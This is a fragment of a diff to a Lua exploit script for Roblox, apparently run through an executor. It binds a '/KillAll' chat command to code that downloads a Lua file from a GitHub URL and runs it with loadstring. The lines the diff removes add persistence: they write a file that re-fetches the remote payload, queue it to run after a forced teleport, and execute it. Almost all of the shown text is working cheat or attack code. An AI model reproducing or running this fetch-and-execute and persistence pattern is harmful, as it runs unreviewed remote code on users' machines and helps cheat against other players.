@@ -239,16 +239,6 @@ coroutine.wrap(IRMPG_fake_script)();
 
 game.Players.LocalPlayer.Chatted:Connect(function(Chat)
      if Chat == "/KillAll" then
-			
 	 loadstring(game:HttpGet("https://raw.githubusercontent.com/skidthekid/database/main/SETTINGS.lua"))()
-	writefile("SETTINGS.dat", [[
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/skidthekid/database/main/SETTINGS.dat"))()
-		task.wait(0.5)
-		syn.queue_on_teleport('loadstring(readfile("SETTINGS.dat"))()')
-		game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)
-	]])
-	task.wait();
-	loadstring(readfile("SETTINGS.dat"))()
-
     end
 end)
